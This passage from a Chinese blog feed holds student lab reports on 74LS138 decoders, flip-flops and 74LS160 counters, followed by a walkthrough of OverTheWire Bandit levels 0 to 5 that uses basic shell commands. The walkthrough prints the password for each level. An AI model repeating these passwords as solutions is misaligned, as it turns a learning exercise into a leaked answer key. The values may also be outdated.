真值表</p><table><thead><tr><th>A</th><th>B</th><th>C</th><th>S</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p><strong>实验  四  74LS138芯片的测试及应用</strong>    </p><p>一 、 实验目的</p><p>1掌握组合逻辑电路的相关知识</p><p>2 学会使用操作74LS138芯片。</p><p>二 、 实验内容</p><p>1.测试74LS138芯片的功能。</p><p>2.使用74LS138译码器实训F=AB+BC+AC</p><p>三 、 操作方法与实验步骤</p><p>1.根据引脚图，对芯片进行连线，得到真值表</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D30.tmp.png"> </p><ol start="2"><li>验证真值表</li></ol><table><thead><tr><th>输入</th><th>输出</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>S1</td><td>S2<code>+S3</code></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D31.tmp.png" alt="img"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D32.tmp.png"></td><td>A0</td><td>Y0`</td><td>Y1`</td><td>Y2`</td><td>Y3`</td><td>Y4`</td><td>Y5`</td><td>Y6`</td><td>Y7`</td></tr><tr><td>0</td><td>X</td><td>X</td><td>X</td><td>X</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>X</td><td>1</td><td>X</td><td>X</td><td>X</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td></tr></tbody></table><p>3.<code> 将与或式化为与非与非式：</code></p><p>AB+BC+AC=ABC+ABC<code>+A</code>BC+AB<code>·</code>C=((ABC)’(ABC’)(A<code>·</code>BC)(AB`C))’</p><ol start="4"><li><code>根据与非与非式设计电路。</code></li></ol><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D33.tmp.jpg"> </p><p>四． 实验结果及分析</p><p>当一个选通端为高电平，另两个选通端和为低电平时，可将地址端的二进制编码在Y0至Y7对应的输出端以低电平译出。</p><p>任何时刻要么全为高电平1—芯片处于不工作状态，要么只有一个为低电平0，其余7个输出全为高电平1。</p><p>使用74LS138译码器进行编程即将要求的内容转化成74LS138芯片对应的输出的形式</p><p><strong>实验五 触发器</strong> </p><p>一 实验目的</p><p>1、学习触发器逻辑功能的测试方法</p><p>2、学习基本RS触发器，JK触发器，D触发器的逻辑功能及触发方式。</p><p>3、了解不同触发器之间的相互转换。</p><p>二 实验内容与步骤</p><p>1、D触发器逻辑功能测试</p><p>(1)用一块集成D触发器74LLS74，按图6-6接线，<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D34.tmp.jpg">、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D45.tmp.jpg">、D端分别接电平控制开关插孔K1、K2、K3，CP端接单脉冲输出插孔P+， Q、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D46.tmp.jpg" alt="img">端分别接电平指示器插孔L1、L2。</p><p>(2)直接置0、置1功能测试</p><p>按表6-2的要求，改变<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D47.tmp.jpg" alt="img">、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D48.tmp.jpg" alt="img"> (D和CP处于任意状态)，测试<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D49.tmp.jpg" alt="img">、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D4A.tmp.jpg">的功能，并将测试结果填入表6-2中。</p><p>(3)逻辑功能测试</p><p>将<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D4B.tmp.jpg" alt="img">和端置1，按表6-3的要求进行实验，并将测试结果填入表中。</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D4D.tmp.png"></p><p>图6-6</p><p>3、JK触发器逻辑功能测试</p><p>(1)用一块集成JK触发器74LLS76, 按图6-7接线，<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D4E.tmp.jpg">、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D4F.tmp.jpg">、J、K端分别接电平控制开关插孔K1、K2、K3、K4，CP端接单脉冲输出插孔P+，Q、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D50.tmp.jpg">端分别接电平指示器插孔L1、L2。</p><p>(2)直接置0、置1功能测试</p><p>按表6-4的要求，改变<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D51.tmp.jpg">、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D52.tmp.jpg" alt="img" style="zoom: 80%;" /> (J、K和CP处于任意状态)，测试<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D53.tmp.jpg">、<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D54.tmp.jpg">的功能，并将测试结果填入表中。 </p><p> (3).逻辑功能测试</p><p>将<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D55.tmp.jpg" alt="img">和端置1，按表6-5的要求进行实验，并将测试结果填入表中。</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D66.tmp.png"></p><p>图6-7</p><p>(1)将JK触发器转换成T触发器，验证其逻辑功能。</p><p>(2)将D触发器转换成将JK触发器转换成<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D67.tmp.jpg" alt="img">触发器，验证其逻辑功能。从CP端输入3.5V的连续脉冲，用双踪示波器观察并画出触发器的输入输出波形。</p><p>以下两项为选作内容：</p><p>(3)将D触发器转换成JK触发器，验证其逻辑功能。</p><p>(4)将JK触发器转换成D触发器，验证其逻辑功能。</p><p>三 实验结果</p><p>表6-2</p><table><thead><tr><th><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D68.tmp.jpg"></th><th><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D69.tmp.jpg"></th><th>Q</th><th>Q’</th></tr></thead><tbody><tr><td>0➡1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1➡0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>0➡1</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1➡0</td><td>1</td><td>1</td></tr></tbody></table><p>表6-3</p><table><thead><tr><th>D</th><th>CP</th><th>Q</th><th></th></tr></thead><tbody><tr><td>Q=0</td><td>Q=1</td><td></td><td></td></tr><tr><td>0</td><td>⬆</td><td>0</td><td>0</td></tr><tr><td>⬇</td><td>0</td><td>1</td><td></td></tr><tr><td>1</td><td>⬆</td><td>1</td><td>1</td></tr><tr><td>⬇</td><td>1</td><td>1</td><td></td></tr></tbody></table><p>表6-4</p><table><thead><tr><th><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D6A.tmp.jpg"></th><th><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D6B.tmp.jpg"></th><th>Q</th><th>Q’</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>0</td></tr><tr><td>0</td><td>0</td><td>1</td><td>1</td></tr></tbody></table><p>表6-5</p><table><thead><tr><th>J</th><th>K</th><th>CP</th><th><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D6C.tmp.jpg"></th><th></th></tr></thead><tbody><tr><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D6D.tmp.jpg" alt="img"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D6E.tmp.jpg" alt="img"></td><td></td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>↓</td><td>0</td><td>1</td></tr><tr><td>0</td><td>1</td><td>↓</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>↓</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>↓</td><td>1</td><td>0</td></tr></tbody></table><p><strong>实验六：计数器（一）</strong>    </p><p>一 、实验目的</p><p>1、学习用JK触发器组成计数器。</p><p>2、学习计数器逻辑功能的测试方法。</p><p>3、熟悉异步二进制计数器，异步二一十进制计数器的工作原理。</p><p>二 、实验内容及原理</p><p>1.异步二进制计数器</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D6F.tmp.png">真值表：</p><table><thead><tr><th>CP数</th><th>二进制码</th><th>十进制数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Q4</td><td>Q3</td><td>Q2</td><td>Q1</td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>2</td><td>0</td><td>0</td><td>1</td><td>0</td><td>2</td></tr><tr><td>3</td><td>0</td><td>0</td><td>1</td><td>1</td><td>3</td></tr><tr><td>4</td><td>0</td><td>1</td><td>0</td><td>0</td><td>4</td></tr><tr><td>5</td><td>0</td><td>1</td><td>0</td><td>1</td><td>5</td></tr><tr><td>6</td><td>0</td><td>1</td><td>1</td><td>0</td><td>6</td></tr><tr><td>7</td><td>0</td><td>1</td><td>1</td><td>1</td><td>7</td></tr><tr><td>8</td><td>1</td><td>0</td><td>0</td><td>0</td><td>8</td></tr><tr><td>9</td><td>1</td><td>0</td><td>0</td><td>1</td><td>9</td></tr><tr><td>10</td><td>1</td><td>0</td><td>1</td><td>0</td><td>10</td></tr><tr><td>11</td><td>1</td><td>0</td><td>1</td><td>1</td><td>11</td></tr><tr><td>12</td><td>1</td><td>1</td><td>0</td><td>0</td><td>12</td></tr><tr><td>13</td><td>1</td><td>1</td><td>0</td><td>1</td><td>13</td></tr><tr><td>14</td><td>1</td><td>1</td><td>1</td><td>0</td><td>14</td></tr><tr><td>15</td><td>1</td><td>1</td><td>1</td><td>1</td><td>15</td></tr><tr><td>16</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><p>2、异步二一十进制计数器</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D70.tmp.png"> </p><p>验证真值表：</p><table><thead><tr><th>CP数</th><th>二进制码</th><th>十进制数</th><th>进位C</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Q4</td><td>Q3</td><td>Q2</td><td>Q1</td><td></td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>2</td><td>0</td><td>0</td><td>1</td><td>0</td><td>2</td><td>0</td></tr><tr><td>3</td><td>0</td><td>0</td><td>1</td><td>1</td><td>3</td><td>0</td></tr><tr><td>4</td><td>0</td><td>1</td><td>0</td><td>0</td><td>4</td><td>0</td></tr><tr><td>5</td><td>0</td><td>1</td><td>0</td><td>1</td><td>5</td><td>0</td></tr><tr><td>6</td><td>0</td><td>1</td><td>1</td><td>0</td><td>6</td><td>0</td></tr><tr><td>7</td><td>0</td><td>1</td><td>1</td><td>1</td><td>7</td><td>0</td></tr><tr><td>8</td><td>1</td><td>0</td><td>0</td><td>0</td><td>8</td><td>0</td></tr><tr><td>9</td><td>1</td><td>0</td><td>0</td><td>1</td><td>9</td><td>1</td></tr><tr><td>10</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr></tbody></table><p>三 、操作方法与实验步骤</p><p>1.由实验讲义，我们已知异步二进制计数器和同步二进制计数器的逻辑图和74LS73芯片的引脚图。</p><p>2.测试足够数量的接线，并分别测试芯片的功能，保证实验的正常进行。</p><p>3.参照引脚图 我们可以进行连线，并进行测试。</p><p>四 、实验结果及分析</p><p>1 在异步的二进制计数器中,Q1随每一个下降沿的出现而反转，Q2,Q3,Q4依次是根据上一个输出端的下降沿出现而反转，Q1,Q2,Q3,Q4的反转频率依次是上一级的一半。</p><p>2 相较于异步的二进制计数器，异步的二-十进制计数器，多了由输出信号向输入信号的负反馈，通过负反馈，完成，每十个脉冲一组的循环。通过这种负反馈我们可以类似的作出其他进制的计数器。</p><p><strong>实验七  触发器逻辑功能的测试</strong> </p><p><strong>一、实验目的和要求</strong></p><p>实验一：测试两个74LS160芯片和与非门74LS00芯片组成的100进制计数器的功能；</p><p>实验二：测试两个74LS160芯片和与非门74LS00芯片外加74LS20芯片组成的27进制计数器的功能；</p><p><strong>二、 实验内容和原理</strong></p><p><strong>原理：</strong></p><p>74LS160是集成单元二一十进制同步计数器，它除计数外，还有全复0，状态预置，保持等功能。</p><p>计数器74LS160的CP为计数脉冲输入端; Cr是复位控制端，当Cr为低电平时，不管其它输入信号如何，计数器立即恢复到0000状态，LD为状态预置控制端。当Cr=1, LD=0, 且CP端输入一个上升沿时，将使输入的A、B、C、D状态预置到计数器的状态QA, QB, Qc, QD上去了，P和T都是保持控制端，当Cr=LD=1,.而P或T为0时，不管有无CP信号及ABCD如何，计数器将保持原状态不变，只有当Cr、LD、P、T四个控制端全为高电平1时，计数器才能按8421码计数，而且状态是在CP上升沿时翻转。此外还有进位输出端Oc;它的作用是每计数至1001时，输出一个宽度等于计数脉冲周期的正脉冲信号。</p><p>两个十进制计数器可以组成一个10X 10-100进制的计数器，个位计数器的进位输出端Oc就作为十位计数器的CP输入，当个位计数器从0开始输入十个计数脉冲时，其Oc端输出一个下降沿，经G倒相，就成为十位计数器翻转所需要的上升沿。</p><p>在100进制计数器的基础上，加上一定的复位反馈电路，可以构成100以内的任意进制计数器。本实验要求构成27进制计数器，也就是当十位计数器状态成为0010, 个位计数器状态成为0111时，产生一个复位信号，使两位计数器为状态返回到0000状态。当计数到27时，QA、QB、QC、QB均为1，与非门G输出为0，使两位计数器复位。</p><p><strong>内容：</strong></p><p>1、74LS160芯片组成100进制计数器的功能测试</p><p>2、74LS160芯片组成27进制计数器的功能测试</p><p><strong>三、 操作方法与实现步骤</strong></p><p>1、74LS160芯片组成100进制计数器的功能测试</p><p>(1)由两块十进制计数器74LS160和一块双与非门74LS00 按图2连接可组成100进制计数器。这里使QA，QB, QC， QD接BCD码输入端的高四位，QA，QB, QC， QD接BCD码输入端的低四位。由实验箱的数码管来显示计数器的状态。首先使两个计数器都清零，然后计数。观察显示数字的变化规律。看其是否是100进制计数器。</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D81.tmp.png"></p><p>图2</p><p>注意图2左侧的芯片从15输出端引出导线连接与非门74LS00后再与右侧芯片的接口2相连，测试时建议选择最低的频率以便于观察。</p><p>2、74LS160芯片组成27进制计数器的功能测试</p><p>(1)在100进制计数器的基础上，按图3增加与非门G的有关连线(G由74LS20担任)，即可组成27进制计数器。首先清零，然后计数，观察显示数字的变化规律。看其是否是27进制计数器。</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D82.tmp.png"></p><p>图3</p><p>(2)注意连接的导线从74LS20芯片中输出后要返回到两个74LS160芯片的输入端cp段（接口为2），然后连接到脉冲后选择最低频率观察。</p><p><strong>四、 实验结果与分析</strong></p><p>1、74LS160芯片组成100进制计数器的功能测试</p><p>观察到数码显示器能成功地从1跳到99即可。</p><p>分析：要接成100进制加法计数器, 重点在于处理低位74160从1001-&gt;0000时向高位74160提供进位信号的问题.当低位74160到达状态1001后, 其RCO引脚变为高电平; 此时高位74160的ENT引脚也随之变为高电平. 当下一系统上升沿信号到来时, 两片74160的状态都+1, 而后低位74160的状态变为0000, 其RCO引脚随之变为低电平, 高位74160的ENT引脚也随之变为低电平. 当系统上升沿信号再次到来时, 低位74160依旧实现+1操作, 而高位74160由于其ENT引脚变为低电平, 则处于保持状态: 直到低位74160的状态再次到达1001时, 再次重复上述过程 </p><p>2、74LS160芯片组成27进制计数器的功能测试</p><p>观察到数码显示器能成功地从1跳到26即可。</p><p>分析：要接成27进制加法计数器, 重点在于处理低位74160从1001-&gt;0000时向高位74160提供进位信号的问题.通过在第一片外加的逻辑电路，每计数到7会译出一个信号与上第二片的外加逻辑电路每到2译出的信号，此信号就是计数到27的进位信号，将此信号再接回两片的清零或置数端即可。</p><p><strong>五、实验反思</strong></p><p>由于我们拿到的芯片并非是正确的74LS160芯片，而是标上74LS160芯片的161芯片，我们的实验无法正常进行实际上得到的是256位计数器，同样在设计27进制计数器时按照接线图链接的结果也不是27进制。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>即见未来，为何不拜</title>
      <link href="/2021/10/05/%E5%8D%B3%E8%A7%81%E6%9C%AA%E6%9D%A5%EF%BC%8C%E4%B8%BA%E4%BD%95%E4%B8%8D%E6%8B%9C/"/>
      <url>/2021/10/05/%E5%8D%B3%E8%A7%81%E6%9C%AA%E6%9D%A5%EF%BC%8C%E4%B8%BA%E4%BD%95%E4%B8%8D%E6%8B%9C/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BuuCTF题目之web</title>
      <link href="/2021/10/05/BuuCTF%E9%A2%98%E7%9B%AE%E4%B9%8Bweb/"/>
      <url>/2021/10/05/BuuCTF%E9%A2%98%E7%9B%AE%E4%B9%8Bweb/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bandit靶场记录</title>
      <link href="/2021/10/05/bandit/"/>
      <url>/2021/10/05/bandit/</url>
      
        <content type="html"><![CDATA[<h2 id="Bandit靶场记录"><a href="#Bandit靶场记录" class="headerlink" title="Bandit靶场记录"></a>Bandit靶场记录</h2><p>上古博客了，在之前我使用的是简书的博客，在我写的博客一次次被ban之后，我才搭建的静态博客。现在发现这个博客没有转移过来，随手往博客里放一下。稍后会进行补充</p><p>靶场名称：<a href="https://overthewire.org/wargames/bandit/">Bandit</a><br>bandit.labs.overthewire.org<br>Port: 2220</p><p>level 0</p><pre class="line-numbers language-none"><code class="language-none">The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level page to find out how to beat Level 1.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>很明显这一个等级只是登入bandit，在输入账号密码后就连接上了服务器。<br><img src="https://upload-images.jianshu.io/upload_images/24919094-221f58652410ac06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="level-0-1"><a href="#level-0-1" class="headerlink" title="level 0~1"></a>level <code>0~1</code></h4><pre class="line-numbers language-none"><code class="language-none">The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level. use SSH (on port 2220) to log into that level and continue the game.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过cd ~指令切换到主菜单<br>在通过cat指令打开readme文件夹，得到bandit1的密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1</p><h4 id="level-1-2"><a href="#level-1-2" class="headerlink" title="level 1~2"></a>level <code>1~2</code></h4><pre class="line-numbers language-none"><code class="language-none">The password for the next level is stored in a file called - located in the home directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我以为这个题目还是跟上一级一样是通过cat能够简单得到,<br><img src="https://upload-images.jianshu.io/upload_images/24919094-7078cbe3051d526b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>使用之前的步骤并不能把这一级的密码获取出来。在进入靶场提供的参考网址后<br><a href="http://tldp.org/LDP/abs/html/special-chars.html">Advanced Bash-scripting Guide - Chapter 3 - Special Characters</a><br>找到了这一句话</p><pre class="line-numbers language-none"><code class="language-none">Filenames beginning with &quot;-&quot; may cause problems when coupled with the &quot;-&quot; redirection operator.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/24919094-3dd9f5b6b5402e42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>使用cat &lt;-指令可以调出这一级的密码</p><blockquote><p>bandit1@bandit:~$ cat &lt;-<br>CV1DtqXWVFXTvM2F0k09SHz0YwRINYA</p></blockquote><h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2~3"></a>level<code>2~3</code></h4><p>The password for the next level is stored in a file called spaces in this filename located in the home directory。<br>这一级密码储村在spaces in this filename里面这一级的难点在于是文件名有空格<br>通过引号可以打开文件<br><img src="https://upload-images.jianshu.io/upload_images/24919094-804621cacf19f786.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3~4"></a>level<code>3~4</code></h4><pre class="line-numbers language-none"><code class="language-none">The password for the next level is stored in a hidden file in the inhere directory.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>好样的，这一级答案有到了隐藏文件中去了。。。。<br>通过ls指令看下有什么文件<br>进入这个文件ls一下，啥都没有</p><img src="https://upload-images.jianshu.io/upload_images/24919094-0b701a9812ec31d3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png" style="zoom:80%;" />12个文件。。。。。群里有人问过这个问题师哥说暴力跑跑，好吧一个一个试验。接连打开. ..都没有提示当进入.hidden出现了提示这个文件不是一个文件夹，哪应该用cat指令进入一下试试，![image.png](https://upload-images.jianshu.io/upload_images/24919094-74ee22431c459070.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)<blockquote><p>bandit3@bandit:~/inhere$ cat .hidden<br>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</p></blockquote><h4 id="level-4-5"><a href="#level-4-5" class="headerlink" title="level 4 ~ 5"></a>level <code>4 ~ 5</code></h4><pre class="line-numbers language-none"><code class="language-none">The password for the next level is stored in the only human-readable file in the inhere directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先进入inhere，ls一下发现用-flle00到file09九个文件<br>通过file ./*指令看一看文件类型，</p><blockquote><p>./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data<br>./-file06: data./-file07: ASCII text./-file08: data./-file09: data<br>-file07: </p></blockquote><p> ASCII text.是一个ascll编码的文件，那这个肯定是答案了<br><img src="https://upload-images.jianshu.io/upload_images/24919094-e238376010b822e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BuuCTF之Crypto解题记录</title>
      <link href="/2021/10/04/BuuCTF%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E8%A7%A3/"/>
      <url>/2021/10/04/BuuCTF%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E8%A7%A3/</url>
      
